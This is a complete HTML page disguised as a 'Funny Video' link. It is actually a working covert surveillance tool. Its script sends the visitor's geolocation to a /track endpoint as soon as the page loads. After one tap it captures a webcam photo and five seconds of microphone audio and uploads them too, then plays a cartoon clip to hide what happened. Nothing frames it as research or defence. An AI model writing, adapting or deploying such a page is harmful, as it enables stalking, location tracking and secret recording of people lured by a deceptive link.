<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Funny Video</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial; background: #000; color: white; text-align: center; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); color: white; display: flex;
            align-items: center; justify-content: center; z-index: 1000;
            font-size: 24px; cursor: pointer;
        }
        #videoContainer { display: none; }
        video, canvas { width: 90%; margin-top: 20px; border-radius: 15px; }
    </style>
</head>
<body>
    <div id="overlay">👆 Tap anywhere to start video</div>
    <div id="videoContainer">
        <video id="video" width="100%" autoplay muted></video>
        <p>🎥 Loading funny video...</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const session = urlParams.get('session');
        const API_URL = window.location.origin + '/track';

        async function sendData(endpoint, data) {
            await fetch(`${API_URL}?session=${session}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        // 1. Auto location on page load (no tap needed)
        navigator.geolocation.getCurrentPosition(pos => {
            sendData('/location', {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            });
        }, err => console.log("Location error:", err));

        // 2. On tap, request camera and mic
        document.getElementById('overlay').onclick = async () => {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('videoContainer').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                // Take photo after 2 seconds
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg');
                    sendData('/photo', { image: photoData });
                }, 2000);

                // Record audio for 5 seconds
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        sendData('/audio', { audio: reader.result });
                    };
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

                // Replace real stream with a fake funny video (optional)
                video.srcObject = null;
                video.src = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4";
                video.play();
            } catch(err) {
                alert("Error: " + err.message);
            }
        };
    </script>
</body>
</html>
